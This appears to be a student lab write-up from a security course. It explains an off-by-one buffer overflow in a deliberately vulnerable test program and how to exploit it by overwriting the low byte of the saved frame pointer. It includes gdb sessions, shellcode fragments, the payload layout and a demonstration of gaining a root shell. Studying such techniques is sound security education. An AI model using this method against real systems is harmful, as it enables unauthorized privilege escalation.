@@ -1,0 +1,198 @@
+##
+## sploit2.txt for pp1 in /home/user/pp1/sploits/
+## 
+## Made by pierre-louis gottfrois
+## Made by pierre fourgeaud
+## 
+## Started on  Sun Jun 04 19:06:57 2012 pierre-louis gottfrois
+##
+
+I ________________________________
+-=(^^)=- THE BUFFER OVERFLOW
+
+Ok so in this file the bug is located in the nstrcpy function. We can see
+that some checks are made on the string length in order to avoid a classic
+buffer overflow. However we can see in the for loop that the index 'i' is
+going from 0 to the length of the string INCLUSIVE. This is bad. This means
+that we can override the string by one byte. The buffer size is define in
+the bar function and set to 200 bytes. What would happen if we run the
+program with a string with a length >= 200 characters ?
+
+Let's try.
+
+$> /tmp/target2 "`printf '%0200d'`"
+Segmentation fault
+$>
+
+Alright, let's play again ;)
+
+II _______________________________
+-=(^^)=- THE EXPLOIT
+
+So we know that our software has a buffer overflow in the function `nstrcpy`
+but only by 1 byte. This means that we won't be able to overflow the all
+stack like in target1.
+
+    +------------------------+
+    |  Return Address (eip)  |
+    +------------------------+
+    |  Frame Pointer  (ebp)  |
+    +------------------------+
+    |                        |
+    |                        |
+    |        Locals          |
+    |                        |
+    |                        |
+    +------------------------+
+    |           .            |
+    |           .            |
+    |           .            |
+    +------------------------+
+
+Our goal is still the same, try to execute and (root) shell by taking over the
+return address of the bar function (further informations bellow).
+
+How can we do that ?
+
+We are going to use the shell-code provided to create a "bad" string that we
+will pass to the targeted program. The difference here between our previous
+buffer overflow exploit, is that we only have 1 byte to overflow the
+"Return Address" (eip)... The address of eip is 4 bytes long. This means
+we can't overwrite it completely. The only think we are able to change is
+the lowest byte, since we are working on i86 (little endian), it is the
+last 2 digits of an address like this:
+
+    0xBF FF FC 48   (forget the spaces, there are here only for readability)
+              |--|
+So in this example, we can only change the '48' byte.
+
+However this turns out to be sufficient to take over our targeted program.
+In fact we can manage to overwrite only the 1 byte of the Frame Pointer (ebp)
+in order to change its value to point somewhere else in memory. We don't have
+many choices, because remember, we can only change the last byte ! But if we
+manage to change it in order to point somewhere in our locals (our buffer)
+then we are good.
+
+             +------------------------+
+             |  Return Address (eip)  |
+             +------------------------+
+             |                        |
+             |  Frame Pointer  (ebp)  |  <-  Here ebp will be poisoned with
+             |        3 bytes         |      our buffer and its 1 extra byte.
+     -       +........................+
+     |       |        1 byte          |
+     |       +------------------------+
+     |    +--|       &shell-code      |  <-  The address of our shell-code.
+     |    |  +........................+
+     |    |  |                        |
+     |    |  |                        |
+     |    |  |       shell-code       |  <-  The shell-code provided.
+     |    |  |                        |
+     |    |  |                        |
+200  |    |  +........................+
+bytes|    |  |                        |
+     |    |  |                        |
+     |    |  |                        |
+     |    |  |                        |
+     |    |  |         NOPs           |  <-  We put NOP (0x90) operations here
+     |    |  |                        |      in order to be able to jump anywhere
+     |    |  |                        |      here. It is also easier when building
+     |    |  |                        |      our exploit code.
+     |    +->|                        |
+     -       +------------------------+
+             |           .            |
+             |           .            |
+             |           .            |
+             +------------------------+
+
+As we know, the processor first push eip into the stack, as the CALL
+instruction requires. Next, it push ebp over it and at the end of the
+function, pop it back in order to restore it. Our buffer overflow
+will poisoned ebp by 1 byte. Since after the function "nstrcpy" returns
+the program pop ebp from the stack and set esp equal to ebp, this means
+we can set esp to an "arbitrary" value. But remember, this arbitrary value
+is not "really" arbitrary, since we can only modify the last esp's byte.
+
+Since we cannot change directly eip's address like in any conventional buffer
+overflow exploitation, we have to make the processor think it is elsewhere.
+When the processor returns from a procedure, it only pops the first word on
+the stack, thinking it is the original eip.
+
+What if we alter esp to make the processor popping a value of our choice,
+thinking it is eip ? This would change the execution flow.
+
+First we need to find the address of our "bad" buffer.
+Let's run both programs using gdb.
+
+$> gdb -silent -e sploit2 -s /tmp/target2
+(gdb) catch exec
+Catchpoint 1 (exec)
+(gdb) r
+Starting program: /home/user/pp1/sploits/sploit2 
+Executing new program: /proc/3113/exe
+/proc/3113/exe: Permission denied.
+(gdb) break 15
+Breakpoint 2 at 0x804847e: file target2.c, line 15.
+(gdb) c
+Continuing.
+[New process 3113]
+[Switching to process 3113]
+
+Breakpoint 2, nstrcpy (out=0xbffffcd0 '\220' <repeats 151 times>, "?\037^\211v\b1?\210F\a\211F\f?\v\211?\215N\b\215V\f?\2001?\211?@?\200?????/bin/sh????"..., outl=200, 
+    in=0xbfffff25 '\220' <repeats 151 times>, "?\037^\211v\b1?\210F\a\211F\f?\v\211?\215N\b\215V\f?\2001?\211?@?\200?????/bin/sh????"...) at target2.c:15
+15	}
+(gdb) p out
+$1 = 0xbffffcd0 '\220' <repeats 151 times>, "?\037^\211v\b1?\210F\a\211F\f?\v\211?\215N\b\215V\f?\2001?\211?@?\200?????/bin/sh????"...
+(gdb)
+
+Here we can see the address of our "bad" buffer (out): 0xbffffcd0
+This is where we need to jump in order to execute our NOPs and our shell-code.
+
+Let's put this address into our exploit.
+Don't remember what our buffer looks like ?
+
+    [nops][shellcode][&shellcode][%ebp_altering_byte]
+
+Great, now we have to find what value we need to overwrite the saved
+ebp's last byte will be the returned address (hold by esp) - 0x04 (because
+of the popping thing).
+
+Let's find the returned address (esp) first using gdb.
+
+$> gdb -silent -e sploit2 -s /tmp/target2
+(gdb) catch exec
+Catchpoint 1 (exec)
+(gdb) r
+Starting program: /home/user/pp1/sploits/sploit2 
+Executing new program: /proc/3125/exe
+/proc/3125/exe: Permission denied.
+(gdb) break bar
+Breakpoint 2 at 0x8048489: file target2.c, line 21.
+(gdb) c
+Continuing.
+[New process 3125]
+[Switching to process 3125]
+
+Breakpoint 2, bar (arg=0xbfffff25 '\220' <repeats 151 times>, "?\037^\211v\b1?\210F\a\211F\f?\v\211?\215N\b\215V\f?\2001?\211?@?\200?????/bin/sh????"...) at target2.c:21
+21	  nstrcpy(buf, sizeof buf, arg);
+(gdb) info reg esp
+esp            0xbffffcb0	0xbffffcb0
+(gdb)
+
+Here it is. Why did we add a break on bar's function ? Well remember, we want the
+address inside esp AFTER the function where the buffer overflow will occur. This
+is because the processor will do he's job and set esp equals to our poisoned ebp.
+
+So now that we have the address of esp (0xbffffcb0), the value to overwrite is just
+simply 0xb0 - 0x04 = 0xac.
+
+Let's add this value to our "bad" buffer.
+
+We are now all set, let's take our exploit for a spin.
+
+$> whoami
+user
+$> ./sploit2
+sh-3.2# whoami
+root
+sh-3.2#
